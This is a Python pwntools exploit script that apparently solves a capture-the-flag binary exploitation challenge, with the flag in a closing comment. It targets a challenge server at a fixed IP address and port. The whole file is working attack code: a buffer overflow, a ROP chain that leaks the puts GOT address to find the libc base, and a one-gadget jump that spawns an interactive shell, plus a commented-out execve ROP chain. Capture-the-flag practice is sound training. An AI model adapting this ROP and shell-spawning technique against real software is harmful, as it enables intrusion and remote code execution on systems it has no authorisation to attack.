#!/usr/bin/env python3

from pwn import *
import time
from Crypto.Util.number import bytes_to_long
import sys

chall = './patched_signal'
commands = '''
hb *0x4006b0
c
hb *0x4009af
c
c
'''

isremote = False
isdebug = False
if len(sys.argv) > 1:
    if sys.argv[1] == 'gdb':
        isdebug = True
        r = gdb.debug(chall, commands)
    elif sys.argv[1] == 'remote':
        isremote = True
        r = remote('34.121.211.139', 2222)
else:
    r = process(chall)
lib = './libc-2.27.so'
elf = ELF(chall)
libc = ELF(lib)

def ready_to_go(data):
    if isremote:
        r.recv()
    else:
        r.recvuntil('Your Choice > ')
    r.sendline('1')
    if isremote:
        print(r.recv())
    else:
        r.recvuntil('Green Signal, write whaterver you want to: ')
    r.sendline(data)

def show_the_vehicle(payload, choice=True):
    if choice:
        if isremote:
            r.recv()
        else:
            r.recvuntil('Your Choice > ')
        r.sendline('3')
        r.recvuntil('Enter the vehicle id: ')
    r.sendline('1')
    r.recvuntil('Do you have any comments?\n')
    r.sendline('1')
    r.recvuntil('Please enter your comments\n')
    r.sendline(payload)

for i in range(13): # 0xc
    ready_to_go(str(i) * 0x1f)

size = 0x128
ready_to_go(str(size))

pop_rdi = 0x400c03
puts_got = elf.got['puts']
call_printf = 0x4008fb
id_addr = 0x602120

pld = p64(id_addr) * 9
pld += p64(pop_rdi)
pld += p64(puts_got)
pld += p64(call_printf)

show_the_vehicle(pld)

time.sleep(0.2)
leak = r.recv()[::-1]
leak = bytes_to_long(leak)
log.success(f'leak got puts = {hex(leak)}')

if isremote:
    # libc6_2.27-3ubuntu1.4_amd64
    libcbase = leak - 0x80aa0
    binsh = libcbase + 0x1b3e1a
    system = libcbase + 0x4f550
    magic = libcbase + 0x10a41c

else:
    libc.address = leak - libc.sym['puts']
    binsh = next(libc.search(b'/bin/sh'))
    system = libc.sym['system']
    magic = libc.address + 0x10a45c # [rsp+0x70] == NULL

log.info(f'libc base = {hex(libc.address)}')
log.info(f'binsh = {hex(binsh)}')
log.info(f'system = {hex(system)}')

rop = p64(id_addr) * 9
rop += p64(magic)

#rop += p64(pop_rdi)
#rop += p64(binsh)
#rop += p64(system)

show_the_vehicle(rop, choice=False)

r.interactive()

"""
0x7ffcf5ba42dc: 0xf5ba431000000000
0x7ffcf5ba42dc: 0xf5ba431000000000

pld += p64(pop_rax)
pld += p64(0x3b)
pld += p64(pop_rdi)
pld += p64(binsh)
pld += p64(pop_rsi)
pld += p64(0)
pld += p64(pop_rdx)
pld += p64(0)
"""

# https://libc.rip/ -> libc6_2.27-3ubuntu1.4_amd64
# shaktictf{y0u_ROPd_the_way_0ut}
